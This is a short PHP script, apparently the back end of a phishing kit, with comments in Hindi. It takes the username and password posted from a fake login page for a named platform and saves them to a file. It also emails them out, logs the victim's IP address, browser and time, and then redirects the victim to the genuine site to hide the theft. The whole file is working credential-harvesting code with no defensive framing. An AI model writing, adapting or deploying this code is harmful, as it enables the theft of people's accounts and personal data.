<?php
session_start();

include_once 'save.php';
include_once 'email.php';

$platform = $_POST['platform'] ?? '';
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

if (!empty($username) && !empty($password)) {
    // लोकल फाइल में सेव करें
    saveCredentials($platform, $username, $password);
    
    // ईमेल पर भेजें (अगर कॉन्फिग किया हो)
    sendEmail($platform, $username, $password);
    
    // डिवाइस की जानकारी सेव करें
    $device_info = [
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'time' => date('Y-m-d H:i:s'),
        'platform' => $platform
    ];
    file_put_contents(__DIR__ . '/../logs/device_info.txt', 
        json_encode($device_info) . PHP_EOL, FILE_APPEND);
}

// असली साइट पर रीडायरेक्ट
include_once 'redirect.php';
redirectToRealSite($platform);
exit;
?>
